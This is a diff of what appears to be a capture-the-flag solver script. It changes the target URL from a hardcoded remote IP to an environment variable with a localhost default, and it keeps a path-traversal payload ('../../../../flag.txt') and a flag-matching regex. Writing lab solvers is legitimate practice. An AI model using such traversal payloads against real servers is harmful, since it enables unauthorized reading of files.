@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import atexit
+import os
 atexit.register(lambda: print("作者 ZluxYao"))
 
 import re
@@ -10,7 +11,7 @@ from urllib.parse import urljoin
 import requests
 
 
-DEFAULT_BASE_URL = "http://47.120.76.57:34309"
+DEFAULT_BASE_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:34309")
 PAYLOAD = "../../../../flag.txt"
 FLAG_RE = re.compile(r"TOGOGO-flag\{[^}\r\n]+\}")
 
